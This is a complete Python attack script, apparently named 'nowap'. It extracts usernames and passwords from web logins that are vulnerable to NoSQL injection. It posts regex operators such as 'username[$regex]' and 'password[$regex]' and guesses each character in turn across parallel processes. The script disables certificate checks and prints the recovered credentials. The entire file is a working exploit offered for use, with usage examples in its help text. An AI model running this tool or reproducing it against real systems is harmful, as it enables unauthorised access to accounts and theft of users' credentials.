#!/usr/bin/env python3

import requests
import string
import argparse

from multiprocessing import Process, Queue

import urllib3
urllib3.disable_warnings()

try:
    import curses
except:
    curses = None


def check(pattern, spot, q, url):
    headers={'content-type': 'application/x-www-form-urlencoded'}
    for c in string.printable:
        if c in ['\t', '\r', '\n', '|', '^', '\\', '`']:
            continue
        if c in ['*', '+', '.', '$', '&', '?']:
            c = "\\" + c
        if len(c) > 1:
            continue
        payload = pattern.format(c)
        q.put((c, spot))
        r = requests.post(url, data = payload, headers = headers, verify = False, allow_redirects = False)
        if 'OK' in r.text or r.status_code == 302:
            q.put((-1, spot))
            return
    q.put((' ', spot))
    q.put((-1, spot))


def gen_patterns(n, base, partial):
    patterns = []
    for x in range(len(partial), n):
        fill = "^" + partial + "."*(x - len(partial))+'{}'+".*" 
        pattern = base.format(fill)
        # print("pat:", pattern)
        patterns.append(pattern)
    return patterns


def run_patterns(patterns, stdscr, length, url, partial, line):
    # Adjust our content type
    procs = []
    q = Queue()
    word = [''] * length
    for i,l in enumerate(partial):
        if stdscr is not None:
            stdscr.addch(1, i, l)
        word[i] = l
    offset = length - len(patterns)
    for x, pattern in enumerate(patterns):
        # print(x, pattern)
        p = Process(target=check, args=(pattern, x+offset, q, url))
        p.start()
        procs.append(p)

    length -= len(partial)
    while length > 0:
        info = q.get()
        if info[0] == -1:
            length -= 1
            continue
        word[info[1]] = info[0]
        if stdscr is not None:
            stdscr.addch(line, info[1], info[0])
            stdscr.refresh()
    for proc in procs:
        proc.join()
    if stdscr is not None:
        for i, l in enumerate(word):
            stdscr.addch(line, i, l)
        stdscr.addch(line, len(word), ' ')
        stdscr.refresh()
    return ''.join(word)


epilog='''
This program can be used to find usernames and passwords associated with an injectable webapp login.
It uses a POST of username/password payload, default form is a body of login=login&username=<username>&password=<password>,
params can be used to change everything except username and password parameters. that'll probably change in the future.

example: ./nowapi -u m http://server.example.com/login.htm

would search for any users starting with the letter 'm'
'''

def parse_args():
    parser = argparse.ArgumentParser('nowap',
        description='iterates usernames and/or passwords for nosql webapps that are injectable',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=epilog)
    parser.add_argument('-i', '--iterate', action='store_true', help='attempt to find all usernames')
    parser.add_argument('-u', '--username', default='', help='specify username or partial username')
    parser.add_argument('--ul', type=int, default=20, help='username max length [%(default)s]')
    parser.add_argument('--pl', type=int, default=20, help='password max length [%(default)s]')
    parser.add_argument('--params', nargs='*', default=['login=login'], help='specify any other params needed [%(default)s]')
    parser.add_argument('--no-curses', action='store_true')
    parser.add_argument('url', help='base url to use for the query')
    return parser.parse_args()


# parse the args before curses takes over, check if curses was imported
args = parse_args()
if curses is None:
    args.no_curses = True


def main(stdscr=None):
    global args
    if stdscr is not None:
        stdscr.clear()
    line = 0
    params = '&'.join(args.params)
    if len(args.username) < args.ul:  # partial or no username
        line += 1
        base = '{}&username[$regex]={{}}&password[$regex]=^.*'.format(params)
    
    if len(args.username) != args.ul:
        patterns = gen_patterns(args.ul, base, args.username)
        username = run_patterns(patterns, stdscr, args.ul, args.url, args.username, line).rstrip()
        if stdscr is None:
            print("username:[{}]".format(username))
    else:
        username = args.username

    line += 1
    base = '{}&username={}&password[$regex]={{}}'.format(params, username)
    patterns = gen_patterns(args.pl, base, '')
    password = run_patterns(patterns, stdscr, args.pl, args.url, '', line)
    if stdscr is None:
        print("password:[{}]".format(password))
    return username, password

if args.no_curses:
    username, password = main()
else:
    username, password = curses.wrapper(main)
print(username, password)
